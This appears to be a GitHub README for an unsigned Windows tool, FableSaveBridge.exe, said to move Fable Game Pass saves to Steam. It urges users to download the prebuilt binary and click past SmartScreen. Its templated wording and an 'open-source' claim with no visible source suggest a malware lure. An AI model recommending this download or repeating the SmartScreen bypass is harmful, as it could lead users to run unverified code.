<p align="center">
  <img src="https://i.postimg.cc/9QJk1nsJ/banner.png" alt="Fable Game Pass to Steam Save Bridge — Convert PC Game Pass (WGS) Saves to Steam" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GamePass%20%E2%86%94%20Steam-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-fable--wgs--bridge--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Fable Game Pass to Steam Save Bridge — Convert PC Game Pass (WGS) Saves to Steam

**Started playing Fable on PC Game Pass and bought the Steam version? Copying files manually from AppData\Local\Packages fails because Xbox App wraps saves inside hashed WGS containers. Extract and bridge your Fable save to Steam cleanly.**

Fable Game Pass to Steam Save Bridge focuses on migrating your Albion progression between PC storefronts on Windows: **reading the `container.index` manifest inside `%LOCALAPPDATA%\Packages\Microsoft.Fable_*\SystemAppData\wgs\`, extracting the inner save payload, and mapping it to `%LOCALAPPDATA%\Fable\SaveGames`**.

This project is aimed at **Fable (2026) players on Windows 10/11** moving saves between the Xbox App (PC Game Pass) and Steam—not editing gold, morality, or unlocking achievements.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Steam Fable does not detect my PC Game Pass save | Xbox App stores saves in hashed `SystemAppData\wgs` containers instead of `.sav` files | Parse `container.index` and extract the raw save payload for Steam |
| Manually copying `wgs` hex files crashes or gets ignored | Random 32-character GUID filenames inside `wgs\` lack Steam slot filenames | Map extracted container blobs to Steam's expected `SaveGames` filenames |
| Multiple numeric folders inside `SystemAppData\wgs` | Each Xbox Live XUID profile creates its own hex subdirectory | Identify the active XUID folder by `container.index` timestamp |
| Steam Cloud overwrites newly converted save on launch | Steam Cloud syncs an empty initial profile over manually placed saves | Disable Steam Cloud briefly for the first boot, save in-game, then re-enable |

## Download for Windows

[**Download FableSaveBridge.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/FableSaveBridge.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `FableSaveBridge.exe`? (Automatic checks in ~2 seconds)

- Automatically locates `%LOCALAPPDATA%\Packages\Microsoft.Fable_*\SystemAppData\wgs` on your PC.
- Reads `container.index` to match hashed GUID blobs back to their real internal save filenames.
- Creates a full dated backup of both your Xbox `wgs` folder and Steam `SaveGames` before converting.
- Outputs clean Steam-compatible save files ready for `%LOCALAPPDATA%\Fable\SaveGames`.

### Sample Diagnostic Output

```text
[FableSaveBridge] Scanning Xbox Game Pass WGS & Steam SaveGames paths...
[OK]   Game Pass Package: C:\Users\Player\AppData\Local\Packages\Microsoft.Fable_8wekyb3d8bbwe
[OK]   WGS Container    : SystemAppData\wgs\000901F8A2B1_0000000000000000000000007A12 (3 slots)
[OK]   Backup Created   : Documents\Fable-SaveBridge-Backup\2026-11-20\
[OK]   Steam Target     : C:\Users\Player\AppData\Local\Fable\SaveGames (Ready)
```

The release ZIP is named `FableSaveBridge.zip`; the Windows executable inside is named `FableSaveBridge.exe`.

1. Close Fable before moving or checking files.
2. Click **Download FableSaveBridge.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `FableSaveBridge.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Fable and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit) with PC Game Pass and/or Steam versions of Fable installed.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `FableSaveBridge.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Encrypted/containerized `wgs` storage in Xbox App

Microsoft Store and PC Game Pass games wrap every save file inside binary `container.*` indexes with 32-character hex filenames that Steam cannot read directly.

### Finding the exact `Microsoft.Fable_*` package folder

Windows hides `Packages` subfolders behind randomized publisher hashes (`_8wekyb3d8bbwe`).

### Preventing Steam Cloud from wiping migrated saves

If Steam Cloud already initialized a blank save slot, launching without saving in-game first can revert the folder.

### Keeping your original Game Pass save untouched

A safe converter reads `wgs` in read-only mode and writes converted files into a separate output/Steam directory.

## Where Fable files normally belong

Fable stores Xbox Game Pass and Steam saves in two separate `%LOCALAPPDATA%` trees:

```text
%LOCALAPPDATA%\Packages\Microsoft.Fable_8wekyb3d8bbwe\SystemAppData\wgs\
```

Inside that structure, key files and subdirectories typically look like this:

```text
Xbox Game Pass (Source):
%LOCALAPPDATA%\Packages\Microsoft.Fable_*\SystemAppData\wgs\<XUID>\
├── container.index
└── <ContainerGUID>\<BlobGUID>

Steam Edition (Target):
%LOCALAPPDATA%\Fable\SaveGames\
```

Always launch the Steam version of Fable once to create the initial `SaveGames` folder structure before transferring converted saves.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close both the Xbox App and Steam versions of Fable.** Ensure cloud sync finishes on both platforms before reading `wgs`.
2. **Launch Steam Fable once to the main menu, then exit.** Initializes `%LOCALAPPDATA%\Fable\SaveGames`.
3. **Back up both `wgs` and Steam `SaveGames` folders.** Keep dated copies in Documents before transferring files.
4. **Extract the WGS container payload into Steam `SaveGames`.** Verify extracted file sizes match the source container blobs.
5. **Launch Steam Fable, load your character, and create a new manual save.** Updates Steam Cloud with your migrated Albion progress.

### Before moving any files

Never delete or rename files inside `SystemAppData\wgs\`; always read from `wgs` and write converted copies to Steam.

## What an effective diagnostic report should tell you

A clear conversion report displays **detected `Microsoft.Fable_*` package path, `container.index` entries, backup location, and target Steam `SaveGames` status**.

## FAQ

**Can I transfer my Fable save from Xbox Game Pass PC to Steam?**

Yes—extracting the inner save payload from `SystemAppData\wgs` allows Steam Fable to load your PC Game Pass progress.

**Will my achievements automatically pop on Steam?**

Story and progression flags inside the save file transfer, though Steam achievement triggers depend on the game's internal checks.

**Does this modify my Xbox Game Pass cloud save?**

No. The `wgs` directory is read-only during extraction, leaving your Game Pass save intact.

**Can I also use this to back up my Steam Fable saves?**

Yes—it automatically creates dated backups of both folders.

## Useful reading

- [Fable Official Page (Xbox Game Studios)](https://www.xbox.com/games/fable)
- [Fable on Steam](https://store.steampowered.com/search/?term=Fable+Playground+Games)

## More Windows Game Diagnostic Tools

- [GearsEDay-WGSSaveConverter](../GearsEDay-WGSSaveConverter) — Gears of War: E-Day Game Pass ↔ Steam save converter
- [Stalker2-WGSSaveMigrator](../Stalker2-WGSSaveMigrator) — S.T.A.L.K.E.R. 2 Game Pass (`wgs`) ↔ Steam save migrator
- [Palworld-GamePassSteamBridge](../Palworld-GamePassSteamBridge) — Palworld Xbox Game Pass ↔ Steam `Level.sav` converter
- [Fable2026-ShaderCrashGuard](../Fable2026-ShaderCrashGuard) — Fable (2026) ForzaTech shader optimization & crash guard

*Independent community project. Not affiliated with Playground Games, Xbox Game Studios, Microsoft, Valve, or Steam.*
 
 
 
 
